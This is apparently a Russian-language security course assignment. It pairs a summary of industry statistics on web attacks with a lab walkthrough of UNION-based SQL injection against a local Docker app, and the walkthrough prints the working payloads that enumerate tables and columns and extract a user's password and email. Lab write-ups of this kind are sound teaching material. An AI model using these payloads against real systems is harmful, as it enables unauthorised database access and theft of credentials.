# Часть 1

## Статистика:  какую долю атак на компании проводят через веб-уязвимости, а также распределение по конкретным уязвимостям

Я собрал несколько свежих источников и попытался проанализировать, какие уязвимости сейчас самые опасные и как часто они встречаются.

### Источники:
- Positive Technologies, 2024–2025 ([ссылка](https://ptsecurity.com/research/analytics/results-of-incident-investigation-and-retrospective-analysis-projects-2024-2025/))
- Solar 4RAYS, 2025–2026 ([ссылка](https://rt-solar.ru/events/news/6367/))
- BI.Zone ([ссылка](https://www.tadviser.ru/index.php/Статья:Безопасность_веб-приложений))
- IBM X-Force, 2024/2025 ([ссылка](https://www.ibm.com/think/insights/x-force-threat-intelligence-index))
- Verizon DBIR, 2024 ([ссылка](https://www.verizon.com/business/resources/reports/dbir/))
- Versaca UltraWAF, ноябрь 2025 ([ссылка](https://vercara.digicert.com/resources/vercara-waf-analysis-report-november-2025))
- Solar 4RAYS, февраль 2026 ([ссылка](https://www.comnews.ru/content/243602/2026-02-03/2026-w06/1008/veb-prilozheniya-stali-bolee-uyazvimymi))
- COCognito, сентябрь 2025 ([ссылка](https://www.scworld.com/news/more-than-half-of-internet-exposed-assets-have-no-web-application-firewall))

### Краткий обзор:

- По Versaca UltraWAF: из 1.28 триллиона веб-запросов четверть были вредоносными (464 млрд). Больше половины атак связаны с cookie (55%), а самые частые типы атак: cookie-based (54.84%), command injection (21%), field format violations (10%). Больше всего атак на сайты путешествий (81%), финансы (16%), технологии (1%).

- Solar 4RAYS (2025–2026): в РФ за год число веб-атак выросло на 89%. Основные проблемы — стороннее ПО, WordPress, сервисы с ИИ.

- COCognito: более 50% облачных активов не имеют WAF, из них 40% собирают персональные данные. У необлачных сервисов 67% без WAF, почти все используют персональные данные.

- Positive Technologies: веб-уязвимости и фишинг — главные векторы проникновения. 25% атак из-за устаревших ОС/ПО, 26% — из-за плохой сегментации сети.

- BI.Zone: ежемесячно обнаруживается ~1000 новых веб-уязвимостей, 25% из них — критические. Для 4% есть публичные эксплойты.

- IBM X-Force: 30% всех брешей — ошибки конфигурации, 25% — некорректная настройка облака.

- Verizon DBIR: 77% взломов веб-приложений — украденные учетные данные, 15% утечек — из-за сторонних компонентов.

### Мои выводы:

1. **Доля успешных атак:** В среднем 25–40% всех атак на компании связаны с веб-уязвимостями. В некоторых сферах (например, travel) этот процент выше 80%.
2. **Распределение по типам уязвимостей:**
   - Cookie-based атаки и ошибки сессий — сейчас самые массовые (по Versaca).
   - Command injection и field format violations — тоже в топе.
   - Сломанный контроль доступа и ошибки конфигурации — около 30% всех уязвимостей (IBM, PT).
   - Уязвимые компоненты и стороннее ПО (WordPress, плагины) — до 25% критических инцидентов.
   - Отсутствие WAF — огромная проблема, особенно для облачных сервисов.
   - SQL-инъекции и XSS — всё ещё опасны для малого бизнеса, но в крупных компаниях их стало меньше из-за WAF и DevSecOps.
3. **Особенности по РФ:** В России основной рост уязвимостей связан с WordPress и сервисами с ИИ.

В целом, сейчас главные проблемы — массовые cookie-атаки, отсутствие защиты (WAF), уязвимые компоненты и ошибки конфигурации. Всё это подтверждается свежими исследованиями и статистикой.


# Часть 2

Выполнил команду `docker-compose up -d`, зашел на `http://localhost:8080` и установил базу, затем открылась страница `http://localhost:8080/task/`, где надо ввести id в качестве параметра

Попробовал сделать разные запросы, типа `http://localhost:8080/task/?id=сикссевен'`, например при id=1 получил:
```
Ваш id:1
Ваш логин:admin
```
Дальше перебором нашел пользователей Vinni-pukh, его id=4 и Volk2, его id=9

Вероятно поле id уязвимо к инъекциям, так что я поробовал ввести `http://localhost:8080/task/?id=67'` и получил ошибку :(

You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''67'' LIMIT 0,1' at line 1

Значит id подставляется в sql запрос без фильтрации и можно попробовать инъекции. Сам запрос скорее всего имеет вид `select * from table where id = 'поле с сайта' limit 0,1;`

Теперь пробую простую инъекцию, чтобы получить все записи:
`http://localhost:8080/task/?id=1' OR '1'='1' -- -`

Однако получаем одну запись все равно, поэтому возможно скрипт выводит только первую строку результата

Дальше нужно узнать, сколько столбцов в запросе. Для этого перебираю варианты с union select, ставим -1 для того, чтобы where id = 'поле с сайта' вернул нам пустоту и значение заполнилось с union
```
http://localhost:8080/task/?id=-1' UNION SELECT 1,2 -- -
http://localhost:8080/task/?id=-1' UNION SELECT 1,2,3 -- -
http://localhost:8080/task/?id=-1' UNION SELECT 1,2,3,4 -- -
```

Страница перестала выдавать ошибку, когда количество столбцов=3.

Дальше хочу узнать, какие таблицы есть в базе данных. Для этого использую инъекцию с information_schema.tables: `http://localhost:8080/task/?id=-1' UNION SELECT 1, GROUP_CONCAT(table_name), 3 FROM information_schema.tables WHERE table_schema=database() -- -`

Получаю список таблиц: `Ваш id:1 Ваш логин:emails,users`.

Теперь узнаю, какие столбцы есть в таблице users: `http://localhost:8080/task/?id=-1' UNION SELECT 1, GROUP_CONCAT(column_name), 3 FROM information_schema.columns WHERE table_name='users' -- -`

Вижу USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password

Аналогично смотрю структуру таблицы emails: `http://localhost:8080/task/?id=-1' UNION SELECT 1, GROUP_CONCAT(column_name), 3 FROM information_schema.columns WHERE table_name='emails' -- -`

Вижу id,email_id

Отлично, теперь мы можем благополучно украсть чужие данные

Пароль пользователя Volk2 (id=9): `http://localhost:8080/task/?id=-1' UNION SELECT username, password, 3 FROM users WHERE id=9 -- -`

Получаю:
```
Ваш id:Volk2
Ваш логин:Wa spoiuuuuu
```

Email пользователя Vinni-pukh (id=4): `http://localhost:8080/task/?id=-1' UNION SELECT id, email_id, 3 FROM emails WHERE id=4 -- -`

Получаю:
```
Ваш id:4
Ваш логин:honey_lover@otus-lab.com
```

**Итог:**
- Пароль Volk2: Wa spoiuuuuu
- Email Vinni-pukh: honey_lover@otus-lab.com
